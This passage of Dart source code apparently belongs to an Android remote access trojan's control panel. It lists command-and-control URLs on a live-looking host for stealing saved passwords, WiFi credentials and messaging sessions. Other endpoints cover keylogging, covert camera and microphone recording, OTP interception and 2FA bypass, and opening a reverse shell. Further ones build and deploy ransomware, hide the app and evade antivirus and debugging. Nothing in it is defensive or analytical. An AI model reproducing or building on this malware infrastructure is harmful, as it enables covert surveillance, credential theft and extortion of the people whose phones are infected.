  static const String ratBlockTouch = "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-touch";
  static const String ratUnblockTouch = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unblock-touch";
  
  // ─── Power Control ───────────────────────────────────────────────
  static const String ratDisablePower = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-power";
  static const String ratEnablePower = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-power";
  
  // ─── Keyboard Control ────────────────────────────────────────────
  static const String ratDisableKeyboard = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-keyboard";
  static const String ratEnableKeyboard = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-keyboard";
  
  // ─── App Management ──────────────────────────────────────────────
  static const String ratInstallApk = "http://kurumi-elaina.dianaxyz.my.id:2101/api/install-apk";
  static const String ratClearAppData = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-app-data";
  static const String ratKillApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/kill-app";
  static const String ratLockApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-app";
  static const String ratUnlockApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-app";
  
  // ─── ADB Control ──────────────────────────────────────────────────
  static const String ratEnableAdb = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-adb";
  static const String ratDisableAdb = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-adb";
  
  // ─── System Control ──────────────────────────────────────────────
  static const String ratFactoryReset = "http://kurumi-elaina.dianaxyz.my.id:2101/api/factory-reset";
  static const String ratLockBootloader = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-bootloader";
  static const String ratUnlockBootloader = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-bootloader";
  static const String ratMountSystemRW = "http://kurumi-elaina.dianaxyz.my.id:2101/api/mount-system-rw";
  static const String ratClearLogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-logs";
  static const String ratBlockNotifications = "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-notifications";
  static const String ratUnblockNotifications = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unblock-notifications";
  
  // ─── Persistence ──────────────────────────────────────────────────
  static const String ratEnablePersistence = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-persistence";
  static const String ratDisablePersistence = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-persistence";
  
  // ─── App Icon Visibility ─────────────────────────────────────────
  static const String ratHideAppIcon = "http://kurumi-elaina.dianaxyz.my.id:2101/api/hide-app-icon";
  static const String ratShowAppIcon = "http://kurumi-elaina.dianaxyz.my.id:2101/api/show-app-icon";
  
  // ─── Device Admin ─────────────────────────────────────────────────
  static const String ratEnableDeviceAdmin = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-device-admin";
  static const String ratDisableDeviceAdmin = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-device-admin";
  
  // ─── WiFi Control ─────────────────────────────────────────────────
  static const String ratEnableWifi = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-wifi";
  static const String ratDisableWifi = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-wifi";
  
  // ─── Flashlight ───────────────────────────────────────────────────
  static const String ratToggleFlashlight = "http://kurumi-elaina.dianaxyz.my.id:2101/api/toggle-flashlight";
  
  // ─── Browser History ──────────────────────────────────────────────
  static const String ratGetBrowserHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-history";
  
  // ─── Saved Passwords ─────────────────────────────────────────────
  static const String ratGetSavedPasswords = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-saved-passwords";
  
  // ─── WiFi Passwords ──────────────────────────────────────────────
  static const String ratGetWifiPasswords = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wifi-passwords";
  
  // ─── SIM Info ─────────────────────────────────────────────────────
  static const String ratGetSimInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-sim-info";
  
  // ─── IMEI ─────────────────────────────────────────────────────────
  static const String ratGetImei = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-imei";
  
  // ─── Root Check ───────────────────────────────────────────────────
  static const String ratCheckRoot = "http://kurumi-elaina.dianaxyz.my.id:2101/api/check-root";
  
  // ─── Social Media Sessions ────────────────────────────────────────
  static const String ratGetWaSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-session";
  static const String ratGetTgSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-session";
  static const String ratGetInstagramSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-instagram-session";
  
  // ─── Emails ───────────────────────────────────────────────────────
  static const String ratGetEmails = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-emails";
  
  // ─── Calendar ─────────────────────────────────────────────────────
  static const String ratGetCalendar = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-calendar";
  
  // ─── Notes ────────────────────────────────────────────────────────
  static const String ratGetNotes = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-notes";
  
  // ─── Running Services ─────────────────────────────────────────────
  static const String ratGetRunningServices = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-running-services";
  
  // ─── Battery History ──────────────────────────────────────────────
  static const String ratGetBatteryHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-battery-history";
  
  // ─── Recent Apps ──────────────────────────────────────────────────
  static const String ratGetRecentApps = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-recent-apps";
  
  // ─── File Manager ─────────────────────────────────────────────────
  static const String ratBrowseFiles = "http://kurumi-elaina.dianaxyz.my.id:2101/api/browse-files";
  static const String ratUploadFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/upload-file";
  static const String ratDownloadFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/download-file";
  static const String ratDeleteFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-file";

  // ==================== ULTIMATE 6 NEW FEATURES ENDPOINTS ====================
  
  // ─── Live Location Tracker ────────────────────────────────────────
  static const String ratStartLiveLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-live-location";
  static const String ratStopLiveLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-live-location";
  static const String ratGetLiveLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-live-location";
  
  // ─── Remote Shell ─────────────────────────────────────────────────
  static const String ratSendShellCommand = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-shell-command";
  static const String ratGetShellOutput = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-shell-output";
  
  // ─── Overlay Attack ───────────────────────────────────────────────
  static const String ratStartOverlay = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-overlay";
  static const String ratStopOverlay = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-overlay";
  
  // ─── Screen Mirroring ─────────────────────────────────────────────
  static const String ratStartScreenMirroring = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-mirroring";
  static const String ratStopScreenMirroring = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-screen-mirroring";
  
  // ─── WebRTC Remote Access ─────────────────────────────────────────
  static const String ratCreateWebRTCSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-web-rtc-session";
  static const String ratGetWebRTCSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-web-rtc-session";
  
  // ─── Ransomware Builder ───────────────────────────────────────────
  static const String ratBuildRansomware = "http://kurumi-elaina.dianaxyz.my.id:2101/api/build-ransomware";
  static const String ratDeployRansomware = "http://kurumi-elaina.dianaxyz.my.id:2101/api/deploy-ransomware";

  // ==================== EXTRA FEATURES - ADVANCED PERSISTENCE ====================
  
  static const String ratEnableAutoStart = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-auto-start";
  static const String ratDisableAutoStart = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-auto-start";
  static const String ratCloneSystemApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clone-system-app";
  static const String ratInjectFramework = "http://kurumi-elaina.dianaxyz.my.id:2101/api/inject-framework";
  static const String ratDisablePlayProtect = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-play-protect";
  static const String ratBypassSELinux = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bypass-selinux";

  // ==================== EXTRA FEATURES - STEALTH & EVASION ====================
  
  static const String ratHideProcess = "http://kurumi-elaina.dianaxyz.my.id:2101/api/hide-process";
  static const String ratFakePackage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/fake-package";
  static const String ratAntiDebugging = "http://kurumi-elaina.dianaxyz.my.id:2101/api/anti-debugging";
  static const String ratAntiVM = "http://kurumi-elaina.dianaxyz.my.id:2101/api/anti-vm";
  static const String ratObfuscateTraffic = "http://kurumi-elaina.dianaxyz.my.id:2101/api/obfuscate-traffic";
  static const String ratSelfDestruct = "http://kurumi-elaina.dianaxyz.my.id:2101/api/self-destruct";

  // ==================== EXTRA FEATURES - NETWORK MANIPULATION ====================
  
  static const String ratMitmProxy = "http://kurumi-elaina.dianaxyz.my.id:2101/api/mitm-proxy";
  static const String ratArpPoison = "http://kurumi-elaina.dianaxyz.my.id:2101/api/arp-poison";
  static const String ratSslStrip = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ssl-strip";
  static const String ratPacketCapture = "http://kurumi-elaina.dianaxyz.my.id:2101/api/packet-capture";
  static const String ratTrafficRedirect = "http://kurumi-elaina.dianaxyz.my.id:2101/api/traffic-redirect";
  static const String ratVpnKillswitch = "http://kurumi-elaina.dianaxyz.my.id:2101/api/vpn-killswitch";
  static const String ratNetworkThrottle = "http://kurumi-elaina.dianaxyz.my.id:2101/api/network-throttle";

  // ==================== EXTRA FEATURES - SOCIAL ENGINEERING ====================
  
  static const String ratFakeLoginInject = "http://kurumi-elaina.dianaxyz.my.id:2101/api/fake-login-inject";
  static const String ratSessionHijack = "http://kurumi-elaina.dianaxyz.my.id:2101/api/session-hijack";
  static const String ratCookieStealer = "http://kurumi-elaina.dianaxyz.my.id:2101/api/cookie-stealer";
  static const String ratOtpInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/otp-interceptor";
  static const String ratBypass2FA = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bypass-2fa";

  // ==================== EXTRA FEATURES - FILE SYSTEM ====================
  
  static const String ratExtractApk = "http://kurumi-elaina.dianaxyz.my.id:2101/api/extract-apk";
  static const String ratModifyHosts = "http://kurumi-elaina.dianaxyz.my.id:2101/api/modify-hosts";
  static const String ratDeleteSystemApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-system-app";
  static const String ratDisableDMVerity = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-dm-verity";
  static const String ratPatchBootImage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/patch-boot-image";
  static const String ratInstallRecovery = "http://kurumi-elaina.dianaxyz.my.id:2101/api/install-recovery";

  // ==================== EXTRA FEATURES - REMOTE ACCESS ====================
  
  static const String ratSshTunnel = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ssh-tunnel";
  static const String ratVncRemote = "http://kurumi-elaina.dianaxyz.my.id:2101/api/vnc-remote";
  static const String ratRdpSession = "http://kurumi-elaina.dianaxyz.my.id:2101/api/rdp-session";
  static const String ratAdbOverNetwork = "http://kurumi-elaina.dianaxyz.my.id:2101/api/adb-over-network";
  static const String ratReverseShell = "http://kurumi-elaina.dianaxyz.my.id:2101/api/reverse-shell";

  // ==================== EXTRA FEATURES - HARDWARE CONTROL ====================
  
  static const String ratOverclockCpu = "http://kurumi-elaina.dianaxyz.my.id:2101/api/overclock-cpu";
  static const String ratUnderclockCpu = "http://kurumi-elaina.dianaxyz.my.id:2101/api/underclock-cpu";
  static const String ratDisableCharging = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-charging";
  static const String ratEnableFastCharging = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-fast-charging";
  static const String ratChangeMac = "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-mac";
  static const String ratSpoofImei = "http://kurumi-elaina.dianaxyz.my.id:2101/api/spoof-imei";
  static const String ratDisableSensors = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-sensors";
  static const String ratHapticFeedback = "http://kurumi-elaina.dianaxyz.my.id:2101/api/haptic-feedback";

  // ==================== EXTRA FEATURES - BATTERY EXPLOIT ====================
  
  static const String ratDrainBattery = "http://kurumi-elaina.dianaxyz.my.id:2101/api/drain-battery";
  static const String ratStopCharging = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-charging";
  static const String ratBatterySpoof = "http://kurumi-elaina.dianaxyz.my.id:2101/api/battery-spoof";
  static const String ratChargeLimit = "http://kurumi-elaina.dianaxyz.my.id:2101/api/charge-limit";

  // ==================== EXTRA FEATURES - CAMERA EXPLOIT ====================
  
  static const String ratRecordVideoBackground = "http://kurumi-elaina.dianaxyz.my.id:2101/api/record-video-background";
  static const String ratStealthPhoto = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stealth-photo";
  static const String ratFaceDetection = "http://kurumi-elaina.dianaxyz.my.id:2101/api/face-detection";
  static const String ratMotionDetection = "http://kurumi-elaina.dianaxyz.my.id:2101/api/motion-detection";
  static const String ratContinuousRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/continuous-recording";
  static const String ratRemoteFlash = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-flash";

  // ==================== EXTRA FEATURES - MICROPHONE EXPLOIT ====================
  
  static const String ratAmbientRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ambient-recording";
  static const String ratVoiceCommandListener = "http://kurumi-elaina.dianaxyz.my.id:2101/api/voice-command-listener";
  static const String ratAudioFrequencyAnalyzer = "http://kurumi-elaina.dianaxyz.my.id:2101/api/audio-frequency-analyzer";
  static const String ratNoiseCancellationBypass = "http://kurumi-elaina.dianaxyz.my.id:2101/api/noise-cancellation-bypass";

  // ==================== EXTRA FEATURES - SMS & CALLS ====================
  
  static const String ratAutoReplySms = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-reply-sms";
  static const String ratForwardSmsEmail = "http://kurumi-elaina.dianaxyz.my.id:2101/api/forward-sms-email";
  static const String ratCallRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/call-recording";
  static const String ratCallForwarding = "http://kurumi-elaina.dianaxyz.my.id:2101/api/call-forwarding";
  static const String ratCallBlocking = "http://kurumi-elaina.dianaxyz.my.id:2101/api/call-blocking";

  // ==================== EXTRA FEATURES - NOTIFICATION ====================
  
  static const String ratNotificationListener = "http://kurumi-elaina.dianaxyz.my.id:2101/api/notification-listener";
  static const String ratNotificationInjector = "http://kurumi-elaina.dianaxyz.my.id:2101/api/notification-injector";
  static const String ratNotificationBlocker = "http://kurumi-elaina.dianaxyz.my.id:2101/api/notification-blocker";
  static const String ratQuickReplyInjection = "http://kurumi-elaina.dianaxyz.my.id:2101/api/quick-reply-injection";

  // ==================== EXTRA FEATURES - CLIPBOARD ====================
  
  static const String ratClipboardMonitor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clipboard-monitor";
  static const String ratClipboardHijack = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clipboard-hijack";
  static const String ratAutoCopy = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-copy";

  // ==================== EXTRA FEATURES - KEYLOGGER ADVANCED ====================
  
  static const String ratKeyloggerTimestamps = "http://kurumi-elaina.dianaxyz.my.id:2101/api/keylogger-timestamps";
  static const String ratKeyloggerAppContext = "http://kurumi-elaina.dianaxyz.my.id:2101/api/keylogger-app-context";
  static const String ratScreenshotOnKeypress = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screenshot-on-keypress";
  static const String ratClipboardLogging = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clipboard-logging";

  // ==================== EXTRA FEATURES - SCREEN CONTROL ADV ====================
  
  static const String ratScreenRecorder = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screen-recorder";
  static const String ratScreenLockOverride = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screen-lock-override";
  static const String ratScreenshotPrevention = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screenshot-prevention";
  static const String ratScreenDimmer = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screen-dimmer";
  static const String ratAlwaysOnDisplay = "http://kurumi-elaina.dianaxyz.my.id:2101/api/always-on-display";
  static const String ratScreenFilter = "http://kurumi-elaina.dianaxyz.my.id:2101/api/screen-filter";

  // ==================== EXTRA FEATURES - APP CONTROL ====================
  
  static const String ratFreezeApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/freeze-app";
  static const String ratUnfreezeApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unfreeze-app";
  static const String ratDisableApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-app";
  static const String ratEnableApp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-app";
  static const String ratClearAppCache = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-app-cache";
  static const String ratForceStopAll = "http://kurumi-elaina.dianaxyz.my.id:2101/api/force-stop-all";

  // ==================== EXTRA FEATURES - DEVICE ADMIN ====================
  
  static const String ratLockDeviceRemote = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-device-remote";
  static const String ratWipeDevice = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-device";
  static const String ratDisableCameraPerm = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-camera-perm";
  static const String ratDisableMicPerm = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-mic-perm";
  static const String ratDisableUsb = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-usb";

  // ==================== EXTRA FEATURES - LOCATION SPOOFING ====================
  
  static const String ratGpsSpoof = "http://kurumi-elaina.dianaxyz.my.id:2101/api/gps-spoof";
  static const String ratMockLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/mock-location";
  static const String ratLocationHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/location-history";
  static const String ratGeofence = "http://kurumi-elaina.dianaxyz.my.id:2101/api/geofence";
  static const String ratSpeedTracking = "http://kurumi-elaina.dianaxyz.my.id:2101/api/speed-tracking";

  // ==================== EXTRA FEATURES - WIFI EXPLOIT ====================
  
  static const String ratWifiScanning = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-scanning";
  static const String ratWifiDeauth = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-deauth";
  static const String ratWifiProbeRequest = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-probe-request";
  static const String ratWifiCaptivePortal = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-captive-portal";
  static const String ratWifiWpsCrack = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-wps-crack";
  static const String ratWifiSignalBooster = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wifi-signal-booster";

  // ==================== EXTRA FEATURES - BLUETOOTH EXPLOIT ====================
  
  static const String ratBluetoothScanning = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bluetooth-scanning";
  static const String ratBluetoothSpoof = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bluetooth-spoof";
  static const String ratBluetoothSniffing = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bluetooth-sniffing";
  static const String ratBluetoothAttack = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bluetooth-attack";
  static const String ratBluetoothKill = "http://kurumi-elaina.dianaxyz.my.id:2101/api/bluetooth-kill";

  // ==================== EXTRA FEATURES - SENSORS ====================
  
  static const String ratAccelerometerData = "http://kurumi-elaina.dianaxyz.my.id:2101/api/accelerometer-data";
  static const String ratGyroscopeData = "http://kurumi-elaina.dianaxyz.my.id:2101/api/gyroscope-data";
  static const String ratMagnetometerData = "http://kurumi-elaina.dianaxyz.my.id:2101/api/magnetometer-data";
  static const String ratProximitySensor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/proximity-sensor";

  // ==================== EXTRA FEATURES - SYSTEM CONTROL ====================
  
  static const String ratBlockSystemUpdate = "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-system-update";
  static const String ratBlockOta = "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-ota";
  static const String ratFactoryResetProtection = "http://kurumi-elaina.dianaxyz.my.id:2101/api/factory-reset-protection";
  static const String ratRootDetectionBypass = "http://kurumi-elaina.dianaxyz.my.id:2101/api/root-detection-bypass";
  static const String ratSafetyNetBypass = "http://kurumi-elaina.dianaxyz.my.id:2101/api/safetynet-bypass";
  static const String ratPlayServicesBypass = "http://kurumi-elaina.dianaxyz.my.id:2101/api/play-services-bypass";

  // ==================== WEB SOCKET ====================
  static const String wsUrl = "ws://public.queen-official.com:2178";

  // ==================== HELPER ====================
  static String getRatCommandUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-command/$deviceId";
  }

  static String getRatResponseUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-response/$deviceId";
  }

  static String getRatLockChatUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-chat/$deviceId";
  }

  static String getRatLiveFrameUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/live-frame/$deviceId";
  }

  static String getRatNotificationsUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-notifications/$deviceId";
  }

  static String getRatHeartbeatUrl(String deviceId) {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/heartbeat/$deviceId";
  }

  static String getRatPairUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/rat/pair";
  }

  static String getRatMyDevicesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/rat/my-devices";
  }

  static String getRatPairIdUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/rat/pairid";
  }

  // ==================== RAT ULTIMATE HELPERS ====================
  
  static String getRatStartKeyloggerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-keylogger";
  }
  
  static String getRatStopKeyloggerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-keylogger";
  }
  
  static String getRatGetKeylogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogs";
  }
  
  static String getRatGetClipboardUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-clipboard";
  }
  
  static String getRatStartVideoRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-video-recording";
  }
  
  static String getRatStopVideoRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-video-recording";
  }
  
  static String getRatStartMicRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-mic-recording";
  }
  
  static String getRatStopMicRecordingUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-mic-recording";
  }
  
  static String getRatGetCallLogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-call-logs";
  }
  
  static String getRatGetInstalledAppsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-installed-apps";
  }
  
  static String getRatGetWifiNetworksUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wifi-networks";
  }
  
  static String getRatGetDeviceInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-device-info";
  }
  
  static String getRatSetVolumeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-volume";
  }
  
  static String getRatGetVolumeUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-volume";
  }
  
  static String getRatBlockTouchUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-touch";
  }
  
  static String getRatUnblockTouchUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unblock-touch";
  }
  
  static String getRatDisablePowerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-power";
  }
  
  static String getRatEnablePowerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-power";
  }
  
  static String getRatDisableKeyboardUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-keyboard";
  }
  
  static String getRatEnableKeyboardUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-keyboard";
  }
  
  static String getRatInstallApkUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/install-apk";
  }
  
  static String getRatClearAppDataUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-app-data";
  }
  
  static String getRatFactoryResetUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/factory-reset";
  }
  
  static String getRatLockBootloaderUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-bootloader";
  }
  
  static String getRatUnlockBootloaderUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-bootloader";
  }
  
  static String getRatMountSystemRWUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/mount-system-rw";
  }
  
  static String getRatClearLogsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-logs";
  }
  
  static String getRatBlockNotificationsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/block-notifications";
  }

  static String getRatUnblockNotificationsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unblock-notifications";
  }

  static String getRatEnablePersistenceUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-persistence";
  }

  static String getRatDisablePersistenceUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-persistence";
  }

  static String getRatHideAppIconUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/hide-app-icon";
  }

  static String getRatShowAppIconUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/show-app-icon";
  }

  static String getRatEnableDeviceAdminUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-device-admin";
  }

  static String getRatDisableDeviceAdminUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-device-admin";
  }

  static String getRatEnableWifiUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-wifi";
  }

  static String getRatDisableWifiUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-wifi";
  }

  static String getRatToggleFlashlightUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/toggle-flashlight";
  }

  static String getRatGetBrowserHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-history";
  }

  static String getRatGetSavedPasswordsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-saved-passwords";
  }

  static String getRatGetWifiPasswordsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wifi-passwords";
  }

  static String getRatGetSimInfoUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-sim-info";
  }

  static String getRatGetImeiUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-imei";
  }

  static String getRatCheckRootUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/check-root";
  }

  static String getRatGetWaSessionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-session";
  }

  static String getRatGetTgSessionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-session";
  }

  static String getRatGetInstagramSessionUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-instagram-session";
  }

  static String getRatGetEmailsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-emails";
  }

  static String getRatGetCalendarUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-calendar";
  }

  static String getRatGetNotesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-notes";
  }

  static String getRatGetRunningServicesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-running-services";
  }

  static String getRatGetBatteryHistoryUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-battery-history";
  }

  static String getRatGetRecentAppsUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-recent-apps";
  }

  static String getRatBrowseFilesUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/browse-files";
  }

  static String getRatUploadFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/upload-file";
  }

  static String getRatDownloadFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/download-file";
  }

  static String getRatDeleteFileUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-file";
  }

  static String getRatLockAppUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-app";
  }

  static String getRatUnlockAppUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-app";
  }

  // ==================== SPYWARE / SADAP HELPERS ====================
  
  static String getRatStartAdvancedKeyloggerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-advanced-keylogger";
  }
  
  static String getRatStopAdvancedKeyloggerUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-advanced-keylogger";
  }
  
  static String getRatGetKeylogsTimestampUrl() {
    return "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogs-timestamp";
  }
  
